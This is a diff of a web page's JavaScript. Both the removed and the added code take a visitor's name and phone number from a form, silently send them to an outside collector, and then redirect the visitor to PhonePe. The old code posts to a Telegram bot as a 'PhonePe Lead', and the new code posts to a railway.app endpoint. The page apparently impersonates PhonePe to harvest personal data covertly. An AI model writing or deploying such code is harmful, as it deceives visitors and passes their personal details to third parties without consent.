@@ -45,38 +45,31 @@
 
   </div>
 </div>
-
-  <script>
-const BOT_TOKEN = "";
-const ADMIN_ID = "8466348943";
-
-document.getElementById("confirmForm").addEventListener("submit", function(e){
-  e.preventDefault(); // ⛔ stop page refresh
-
+<script>
+function submitForm() {
   const name = document.getElementById("name").value.trim();
   const phone = document.getElementById("phone").value.trim();
 
-  if(name.length < 2 || phone.length < 8){
+  if (name.length < 2 || phone.length < 8) {
     alert("Please enter valid details");
     return;
   }
 
-  // ✅ Send data to Telegram silently
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+  fetch("telegram-bot-production-2ea6.up.railway.app/submit", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({
-      chat_id: ADMIN_ID,
-      text: `📲 PhonePe Lead\n👤 Name: ${name}\n📞 Phone: ${phone}`
-    })
-  }).catch(()=>{});
-
-  // 🚀 Redirect user immediately
-  window.location.href = "https://play.google.com/store/apps/details?id=com.phonepe.app";
-});
+    body: JSON.stringify({ name, phone })
+  })
+  .finally(() => {
+    // Redirect ALWAYS happens
+    window.location.href =
+      "https://phon.pe/30fjw1gh";
+  });
+}
 </script>
+ 
   
 </body>
 </html>
